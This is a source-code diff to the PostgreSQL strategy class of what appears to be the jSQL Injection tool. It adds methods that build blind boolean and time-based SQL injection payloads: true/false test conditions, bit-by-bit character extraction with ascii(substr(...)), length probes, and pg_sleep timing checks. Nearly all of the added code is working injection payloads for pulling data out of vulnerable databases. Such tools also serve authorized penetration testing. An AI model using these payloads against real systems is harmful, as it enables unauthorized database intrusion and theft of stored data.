@@ -5,6 +5,7 @@ import java.util.List;
 
 import com.jsql.model.bean.Database;
 import com.jsql.model.bean.Table;
+import com.jsql.model.blind.ConcreteTimeInjection;
 import com.jsql.model.injection.MediatorModel;
 import com.jsql.tool.ToolsString;
 
@@ -12,7 +13,7 @@ public class PostgreSQLStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return 
+        return
             "concat_ws(" +
                 "'{%}'," +
                 "version()," +
@@ -26,7 +27,7 @@ public class PostgreSQLStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaList() {
-        return 
+        return
             "select+array_to_string(array(" +
                 "select" +
                     "'%04'||" +
@@ -119,10 +120,94 @@ public class PostgreSQLStrategy extends ASQLStrategy {
             "||" +
             "'%01%03%03%07'";
     }
+    
+    @Override
+    public String[] getListFalseTest() {
+        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
+    }
+
+    @Override
+    public String[] getListTrueTest() {
+        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
+    }
+
+    @Override
+    public String getBlindFirstTest() {
+        return "0%2b1=1";
+    }
+
+    @Override
+    public String blindCheck(String check) {
+        return "+and+" + check + "--+";
+    }
+
+    @Override
+    public String blindBitTest(String inj, int indexCharacter, int bit) {
+        /**
+         * true bit return bit, false bit return 0
+         * 8 & 8 = 8, 8 & 4 = 0
+         */
+        return "+and+0!=(ascii(substr(" + inj + "," + indexCharacter + ",1))%26" + bit + ")--+";
+    }
+
+    @Override
+    public String blindLengthTest(String inj, int indexCharacter) {
+        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
+    }
+
+    @Override
+    public String timeCheck(String check) {
+        return "+and+''=''||(select+CASE+WHEN+" + check + "+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP + ")END)--+";
+    }
+
+    @Override
+    public String timeBitTest(String inj, int indexCharacter, int bit) {
+        return "+and+''=''||(select+CASE+WHEN+0!=(ascii(substr(" + inj + "," + indexCharacter + ",1))%26" + bit + ")+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP + ")END)--+";
+    }
+
+    @Override
+    public String timeLengthTest(String inj, int indexCharacter) {
+        return "+and+''=''||(select+CASE+WHEN+char_length(" + inj + ")>" + indexCharacter + "+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP + ")END)--+";
+    }
+
+    @Override
+    public String blindStrategy(String sqlQuery, String startPosition) {
+        return
+            /**
+             * Enclosing '(' and ')' used for internal query, i.e [...]char_length((select ...))[...]
+             */
+            "(" +
+                "select+" +
+                "" +
+                    "'SQLi'||" +
+                    "substr(" +
+                        "(" + sqlQuery + ")," +
+                        startPosition + "," +
+                        MediatorModel.model().performanceLength +
+                    ")" +
+                "" +
+            ")";
+    }
+
+    @Override
+    public String timeStrategy(String sqlQuery, String startPosition) {
+        return
+            "(" +
+                "select+" +
+                    "" +
+                        "'SQLi'||" +
+                        "substr(" +
+                            "(" + sqlQuery + ")," +
+                            startPosition + "," +
+                            MediatorModel.model().performanceLength +
+                        ")" +
+                    "" +
+            ")";
+    }
 
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
-        return 
+        return
             "select+" +
                 /**
                  * If reach end of string (SQLii) then NULLIF nullifies the result
@@ -136,7 +221,7 @@ public class PostgreSQLStrategy extends ASQLStrategy {
 
     @Override
     public String performanceQuery(String[] indexes) {
-        return 
+        return
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
                 "(select+'SQLi'||$1||repeat(chr(35),1024)||'iLQS')"
